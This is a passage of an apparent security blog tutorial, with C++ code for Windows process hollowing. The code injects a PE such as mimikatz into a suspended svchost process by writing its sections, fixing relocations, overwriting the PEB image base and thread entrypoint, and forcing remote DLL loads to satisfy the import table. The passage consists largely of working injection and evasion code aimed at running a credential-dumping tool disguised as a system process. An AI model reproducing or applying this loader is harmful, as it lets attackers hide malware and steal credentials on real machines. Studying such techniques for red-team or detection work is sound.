                <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot read target process memory at %p, ERROR CODE: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">),</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Address To Patch: %p -&gt; Address Patched: %p </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">VOID</span><span class="o">*</span><span class="p">)</span><span class="n">PatchedAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">VOID</span><span class="o">*</span><span class="p">)(</span><span class="n">PatchedAddress</span> <span class="o">+</span> <span class="n">DeltaImageBase</span><span class="p">));</span>

            <span class="n">PatchedAddress</span> <span class="o">+=</span> <span class="n">DeltaImageBase</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PatchedAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">AddressLocation</span><span class="p">),</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/Reloc.png" alt="Relocation phase" /></p>

<h3 id="changing-the-entrypoint-and-resuming-the-execution">Changing the entrypoint and resuming the execution</h3>

<p>After the relocation phase done. The last step is to change the address of the register RCX of the remote process thread context with the address of the entrypoint of the injected PE. Also it is needed to change the address of the Image Base Address included in the PEB which is contained in the RDX register.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">CONTEXT</span> <span class="n">CTX</span> <span class="o">=</span> <span class="p">{};</span>
<span class="n">CTX</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_FULL</span><span class="p">;</span>

<span class="c1">// Retrieve main thread context of the remote process
</span>
<span class="n">BOOL</span> <span class="n">bGetContext</span> <span class="o">=</span> <span class="n">GetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bGetContext</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error occured when trying to get the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Overwrite the Image Base Address inside the PEB
</span>
<span class="c1">// PEB @ RDX
</span>
<span class="c1">// PPEB-&gt;ImageBaseAddress = PPEB+0x10
</span>
<span class="n">BOOL</span> <span class="n">bWritePEB</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">CTX</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">nullptr</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bWritePEB</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error occured when trying to write the image base in the PEB.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Overwrite RCX with the address of the injected PE entry point
</span>
<span class="n">CTX</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">peInjectNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>

<span class="n">BOOL</span> <span class="n">bSetContext</span> <span class="o">=</span> <span class="n">SetThreadContext</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">CTX</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSetContext</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] An error occured when trying to set the thread context.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Resume the thread
</span>
<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hThread</span><span class="p">);</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/PHBasic.png" alt="Basic Process Hollowing" /></p>

<p>Once the thread resumed, we obtain our calc.exe. However, if we change the injected PE with a binary which has an IAT such as <code class="language-plaintext highlighter-rouge">mimikatz</code>, we can observe that the process crashes because it lacks the dependancies.</p>

<p><img src="assets/img/posts/20240124/mimikatzIATLess.png" alt="Basic Process Hollowing with Mimikatz" /></p>

<p>We now need to resolve the mimikatz IAT to be able to execute it without any crash.</p>

<p><img src="assets/img/posts/20240124/mimikatzIAT.png" alt="Mimiaktz IAT" /></p>

<h2 id="make-the-remote-process-load-the-required-libraries">Make the remote process load the required libraries</h2>

<h3 id="load-an-arbitrary-dll-in-a-remote-process">Load an arbitrary DLL in a remote process</h3>

<p>Having established a basic process hollowing code, our objective is to enhance it to be able to load any PE. We will use the binary <code class="language-plaintext highlighter-rouge">mimikatz</code> as our injected PE, while maintaining the <code class="language-plaintext highlighter-rouge">svchost</code> binary as the remote process into which we intend to inject <code class="language-plaintext highlighter-rouge">mimikatz</code>.</p>

<p>The first step is a common technic used to make a remote process load an arbitrary DLL:</p>
<ul>
  <li>Allocate memory in the remote process</li>
  <li>Write the name of the DLL inside the remote process in our newly allocated memory</li>
  <li>Create a remote thread on <code class="language-plaintext highlighter-rouge">LoadLibrary</code> function with our DLL name as argument.</li>
</ul>

<p>We can determine the address of <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>, because every process on a Windows system has the same addresses for the libraries <code class="language-plaintext highlighter-rouge">ntdll.dll</code> and <code class="language-plaintext highlighter-rouge">kernel32.dll</code> which are automaticaly loaded. Since <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> is declared in <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, we only need to resolve the address of <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> in our process and it will be the exact same address in the remote process.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">remoteLoadLibrary</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">libToLoad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PVOID</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">libToLoad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">addr</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"Error allocating memory into process 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">libToLoad</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">libToLoad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in writing into process @0x%p -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">PVOID</span> <span class="n">loadlib</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"LoadLibraryA"</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">loadlib</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hThread</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="n">or</span> <span class="o">!</span><span class="n">hThread</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in creating remote thread 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Let’s try our function to make our <code class="language-plaintext highlighter-rouge">svchost</code> process load <code class="language-plaintext highlighter-rouge">winhttp.dll</code> for example.<br />
<img src="assets/img/posts/20240124/SvcHostBreak.png" alt="svchost launched in suspended" />
When we look at the process launched in suspended state, we can observe that only the <code class="language-plaintext highlighter-rouge">ntdll.dll</code> is loaded.<br />
But if we call our function, we will observe that <code class="language-plaintext highlighter-rouge">winhttp.dll</code> will be sucessfuly loaded.</p>

<p><img src="assets/img/posts/20240124/svcHostLoad.png" alt="svchost with winhttp.dll" /></p>

<p>The other loaded dll are the libraries needed by the legitimate <code class="language-plaintext highlighter-rouge">svchost</code> process.</p>

<h3 id="resolve-injected-pe-iat-to-make-the-remote-process-load-all-the-dependencies">Resolve injected PE IAT to make the remote process load all the dependencies</h3>

<p>Now that we have a method to make the remote process load arbitrary DLLs, we now need to parse our injected PE to retrieve all its dependancies.<br />
When a PE is loaded, there is a difference in addresses between the PE on the disk and the PE in memory. For example, when we copy our PE sections, we retrieve the section through the attribute <code class="language-plaintext highlighter-rouge">PointerToRawData</code> but the destination use the attribute <code class="language-plaintext highlighter-rouge">VirtualAddress</code>. When we open our binary in <code class="language-plaintext highlighter-rouge">PE Bear</code>, we can easily observe that there is a difference in the section mapping when it is on the disk and when it is loaded in memory.</p>

<p><img src="assets/img/posts/20240124/SectionDiff.png" alt="Section Mapping diff" /></p>

<p>Since the IAT is located in the <code class="language-plaintext highlighter-rouge">.rdata</code> section, if we retrieve it like we would have done when performing reflective loading, we won’t be able to get it since there is an offset between our PE read from the disk and the PE that is loaded in memory. Therefore, in a first time we will modify slightly our function <code class="language-plaintext highlighter-rouge">copyPEinTargetProcess</code> to be able to retrieve the <code class="language-plaintext highlighter-rouge">.rdata</code> offset between the <code class="language-plaintext highlighter-rouge">PointerToRawData</code> and the <code class="language-plaintext highlighter-rouge">VirtualAddress</code>.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">copyPEinTargetProcess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">pHandle</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">&amp;</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">PIMAGE_SECTION_HEADER</span><span class="o">&amp;</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
<span class="p">{</span>

    <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">;</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing Header into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Headers written at : 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">);</span>

    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Writing section into target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>


    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">currentSectionHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span><span class="p">)((</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">peInjectNtHeaders</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_FILE_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">SizeOfOptionalHeader</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_SECTION_HEADER</span><span class="p">)));</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".reloc"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">peToInjectRelocSection</span> <span class="o">=</span> <span class="n">currentSectionHeader</span><span class="p">;</span>
            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Reloc table found @ 0x%p offset</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">UINT64</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">peToInjectContent</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Section %s written at : 0x%p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".rdata"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="o">*</span><span class="n">offsetRdata</span> <span class="o">=</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="o">-</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="s">".text"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">UINT64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">+</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">currentSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">_err</span><span class="p">(</span><span class="s">"Error in changing permissions on .text sections to RX -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] Permissions changed to RX on .text section </span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>


    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>The function now takes an additional argument that is a pointer to a <code class="language-plaintext highlighter-rouge">DWORD</code> to be able to retrieve the offset of <code class="language-plaintext highlighter-rouge">rdata</code> section.<br />
Now let’s create a little function to test if we can resolve <code class="language-plaintext highlighter-rouge">mimikatz</code> IAT. To resolve it we need to get a pointer to the first import descriptor (do not forget to apply the <code class="language-plaintext highlighter-rouge">.rdata</code> offset when we compute the address) <code class="language-plaintext highlighter-rouge">PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImage + importsDirectory.VirtualAddress - offsetRdata );</code>. And then we need to iterate until the structure is empty to retrieve all libraries in the IAT.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">loadImportTableLibs</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">importDescriptor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">importsDirectory</span> <span class="o">=</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">Size</span> <span class="o">&lt;=</span> <span class="mi">20</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Empty IAT"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">importDescriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_DESCRIPTOR</span><span class="p">)(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">-</span> <span class="n">offsetRdata</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span><span class="p">);</span>


    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Get Import Directory Table at %p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">importDescriptor</span><span class="p">);</span>

    <span class="n">LPSTR</span> <span class="n">libName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">HMODULE</span> <span class="n">lib</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">libName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>

        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] library to load: %s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">libName</span><span class="p">);</span>
    
        <span class="n">importDescriptor</span><span class="o">++</span><span class="p">;</span>

    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/IATResolve.png" alt="Resolving mimikatz IAT" /></p>

<p>As observed, we can resolve mimikatz IAT. Now we can apply our function <code class="language-plaintext highlighter-rouge">remoteLoadLibrary</code> in the function to make our remote process load our dependancies.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">loadImportTableLibs</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">libName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>

        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] library to load: %s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">libName</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">remoteLoadLibrary</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">libName</span><span class="p">))</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>

        <span class="n">importDescriptor</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Now let’s check if our process has successfuly loaded <code class="language-plaintext highlighter-rouge">mimikatz</code> dependencies.
<img src="assets/img/posts/20240124/loadDependancies.png" alt="Mimikatz dependancies loaded" /></p>

<p>We can observe that our process has loaded all mimikatz dependencies. Now let’s find a way to find the libraries base address in our code to be able to fix the IAT addresses.</p>

<h2 id="resolve-the-functions-and-libraries-addresses-on-the-remote-process">Resolve the functions and libraries addresses on the remote process</h2>

<h3 id="retrieve-the-libraries-and-function-addresses">Retrieve the libraries and function addresses</h3>

<p>Now that we have our remote process with <code class="language-plaintext highlighter-rouge">mimikatz</code> dependancies loaded, we need to retrieve the address of the functions referenced in the IAT to be able to patch it. Otherwise, the pointers of the DLL imports will point to incorrect addresses.</p>

<p>To retrieve the loaded libraries in the remote process, we need to create a snapshot of our remote process using the function <code class="language-plaintext highlighter-rouge">CreateToolhelp32Snapshot</code>. The function will return a <code class="language-plaintext highlighter-rouge">HANDLE</code> on the snapshot on which we will be able to call the functions <code class="language-plaintext highlighter-rouge">Module32FirstW</code> and <code class="language-plaintext highlighter-rouge">Module32NextW</code> to retrieve the different libraries with the corresponding addresses. The functions return a <code class="language-plaintext highlighter-rouge">MODULEENTRY32W</code> structure used to represent the loaded library. <br />
Let’s create a little function to enumerate the loaded libraries to determine if we can successfuly retrieve the corresponding addresses.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">listModulesOfProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">;</span>
